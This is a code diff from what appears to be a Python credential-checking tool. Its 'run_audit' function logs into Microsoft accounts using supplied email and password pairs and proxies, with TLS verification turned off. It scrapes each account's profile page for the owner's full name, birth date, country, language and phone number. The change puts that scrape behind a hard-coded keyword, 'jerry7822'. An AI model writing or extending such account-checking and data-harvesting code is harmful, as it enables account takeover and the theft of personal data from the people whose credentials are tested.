@@ -458,29 +458,31 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                     country = country.split('-')[-1].upper()
                     
         # Deep Scrape: Microsoft Account Profile Page
-        try:
-            profile_html_res = session.get("https://account.microsoft.com/profile", verify=False, timeout=15)
-            if profile_html_res.status_code == 200:
-                html_text = profile_html_res.text
-                
-                if name == "N/A" or not name:
-                    m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                    if m: name = m.group(1)
-                
-                m = re.search(r'"(?:Country|CountryOrRegion)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                if m: country = m.group(1).upper()
+        # ⚠️ RED DE SEGURIDAD EXPERIMENTAL (jerry7822): Saltar scraping profundo si se pasa el keyword
+        if keyword != "jerry7822":
+            try:
+                profile_html_res = session.get("https://account.microsoft.com/profile", verify=False, timeout=15)
+                if profile_html_res.status_code == 200:
+                    html_text = profile_html_res.text
                     
-                m = re.search(r'"(?:BirthDate|DateOfBirth|dob)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                if m: dob = m.group(1)
+                    if name == "N/A" or not name:
+                        m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                        if m: name = m.group(1)
+                    
+                    m = re.search(r'"(?:Country|CountryOrRegion)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                    if m: country = m.group(1).upper()
                         
-                m = re.search(r'"(?:Language|Locale)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                if m: language = m.group(1)
+                    m = re.search(r'"(?:BirthDate|DateOfBirth|dob)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                    if m: dob = m.group(1)
+                            
+                    m = re.search(r'"(?:Language|Locale)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                    if m: language = m.group(1)
 
-                phone_matches = re.findall(r'"ProofName"\s*:\s*"(\+\d+[^"]+)"', html_text, re.IGNORECASE)
-                if not phone_matches: phone_matches = re.findall(r'"PhoneNumber"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                if phone_matches: phone = phone_matches[0]
-        except Exception:
-            pass
+                    phone_matches = re.findall(r'"ProofName"\s*:\s*"(\+\d+[^"]+)"', html_text, re.IGNORECASE)
+                    if not phone_matches: phone_matches = re.findall(r'"PhoneNumber"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                    if phone_matches: phone = phone_matches[0]
+            except Exception:
+                pass
                 
         # Fallback TLD
         if country == "N/A" or not country or country == "XZ":
